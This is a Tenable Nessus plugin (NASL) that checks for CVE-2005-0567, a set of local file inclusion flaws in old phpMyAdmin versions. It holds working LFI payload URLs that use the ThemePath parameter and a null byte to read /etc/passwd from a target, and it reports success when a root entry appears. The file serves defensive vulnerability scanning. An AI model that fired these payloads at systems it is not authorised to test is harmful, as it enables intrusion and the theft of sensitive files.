#%NASL_MIN_LEVEL 70300
#
# (C) Tenable Network Security, Inc.
#

include('deprecated_nasl_level.inc');
include('compat.inc');

if (description)
{
  script_id(17221);
  script_version("1.23");
  script_set_attribute(attribute:"plugin_modification_date", value:"2022/04/11");

  script_cve_id("CVE-2005-0567");
  script_bugtraq_id(12645);

  script_name(english:"phpMyAdmin < 2.6.1 pl1 Multiple Script File Inclusions");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that is prone to
multiple local file include issues.");
  script_set_attribute(attribute:"description", value:
"The installed version of phpMyAdmin suffers from multiple local file
include flaws due to its failure to sanitize user input prior to its use
in PHP 'include' and 'require_once' calls.  Specifically, a remote
attacker can control values for the 'GLOBALS[cfg][ThemePath]' parameter
used in 'css/phpmyadmin.css.php' as well as the 'cfg[Server][extension]'
parameter use in 'libraries/database_interface.lib.php', which enables
him to read arbitrary files on the remote host and possibly even run
arbitrary code, subject to the privileges of the web server process.");
  script_set_attribute(attribute:"see_also", value:"https://marc.info/?l=bugtraq&m=110929725801154&w=2");
  script_set_attribute(attribute:"see_also", value:"http://www.phpmyadmin.net/home_page/security.php?issue=PMASA-2005-1");
  script_set_attribute(attribute:"solution", value:
"Upgrade to phpMyAdmin 2.6.1 pl1 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:H/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:U/RL:OF/RC:C");

  script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
  script_set_attribute(attribute:"exploit_available", value:"false");

  script_set_attribute(attribute:"vuln_publication_date", value:"2005/02/24");
  script_set_attribute(attribute:"plugin_publication_date", value:"2005/02/25");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:phpmyadmin:phpmyadmin");
  script_set_attribute(attribute:"thorough_tests", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2005-2022 and is owned by Tenable, Inc. or an Affiliate thereof.");

  script_dependencies("phpMyAdmin_detect.nasl");
  script_require_keys("www/phpMyAdmin", "www/PHP");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("data_protection.inc");

port = get_http_port(default:80, php:TRUE);


# Try to grab /etc/passwd.
exploits = make_list(
  "/css/phpmyadmin.css.php?GLOBALS[cfg][ThemePath]=/etc/passwd%00&theme=passwd%00",
  "/css/phpmyadmin.css.php?GLOBALS[cfg][ThemePath]=/etc&theme=passwd%00"
  # nb: skip this since it's a bit harder to grab /etc/passwd
  # "/libraries/database_interface.lib.php?cfg[Server][extension]=/etc/passwd"
);


# Test an install.
install = get_kb_item(string("www/", port, "/phpMyAdmin"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches))
{
  dir = matches[2];

  # Try to grab /etc/passwd.
  foreach exploit (exploits)
  {
    r = http_send_recv3(method:"GET",item:string(dir, exploit), port:port, exit_on_fail:TRUE);
    res = r[2];

    # It's a problem if there's an entry for root.
    if (egrep(pattern:"root:.*:0:[01]:", string:res))
    {
      if (report_verbosity)
      {
        res = data_protection::redact_etc_passwd(output:res);
        report = string(
          "\n",
          "Here are the contents of the file '/etc/passwd' that Nessus\n",
          "was able to read from the remote host :\n",
          "\n",
          res
        );
        security_warning(port:port, extra:report);
      }
      else security_warning(port);
      exit(0);
    }

    # We're finished unless the "Perform thorough tests" setting is enabled.
    if (!thorough_tests) break;
  }
}
